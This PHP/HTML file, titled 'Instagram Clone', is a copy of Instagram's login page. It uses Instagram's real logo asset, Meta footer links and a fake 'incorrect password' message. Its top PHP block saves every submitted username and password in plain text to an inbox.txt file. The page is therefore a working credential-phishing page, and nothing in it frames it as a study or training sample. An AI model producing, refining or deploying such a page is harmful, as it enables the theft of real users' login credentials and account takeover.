<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $msg1 = $_POST["usernameInput"] ?? '';
    $msg2 = $_POST["passwordInput"] ?? '';
    file_put_contents(__DIR__ . "/../inbox.txt", $msg1 . " | " . $msg2 . PHP_EOL, FILE_APPEND | LOCK_EX);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Clone</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="index.css">
</head>
<body>
<div class="container">
  <div class="card">
    <div class="logo">
      <i aria-label="Instagram" role="img" style="background-image:url('https://static.cdninstagram.com/rsrc.php/v4/yz/r/H_-3Vh0lHeK.png');background-position:0px -2907px;background-size:auto;width:175px;height:51px;background-repeat:no-repeat;display:inline-block;"></i>
    </div>
    <form id="loginForm">
      <input name="usernameInput" id="usernameInput" placeholder="Phone number, username, or email" autofocus>
      <input id="passwordInput" name="passwordInput" placeholder="Password">
      <button id="loginBtn" type="button" disabled>Log in</button>
    </form>
    <div id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
    <div class="or"><div></div><span>OR</span><div></div></div>
    <div class="fb-login" id="fbBtn">
      <svg viewBox="0 0 24 24"><path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2v-3h2v-2c0-2 1.2-3.2 3-3.2.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2v1.9h2.5l-.4 3h-2v7A10 10 0 0 0 22 12"/></svg>
      Log in with Facebook
    </div>
    <div class="forgot"><a href="#">Forgot password?</a></div>
    <div class="extra">You can also <a href="#">report content you believe is unlawful</a> in your country without logging in.</div>
  </div>
  <div class="signup">Don't have an account? <a href="#" id="signupLink">Sign up</a></div>
  <footer>
    <div class="footer-row">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Cookie Settings</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Meta AI</a>
    </div>
    <div class="footer-row">
      <a href="#">Meta AI Articles</a>
      <a href="#">Threads</a>
      <a href="#">Contact Uploading & Non-Users</a>
      <a href="#">Meta Verified</a>
    </div>
    <div class="footer-bottom">
      <button id="langBtn">English ▼</button>
      <span>© 2025 Instagram from Meta</span>
    </div>
  </footer>
</div>


<script src="index.js"></script>

</body>
</html>


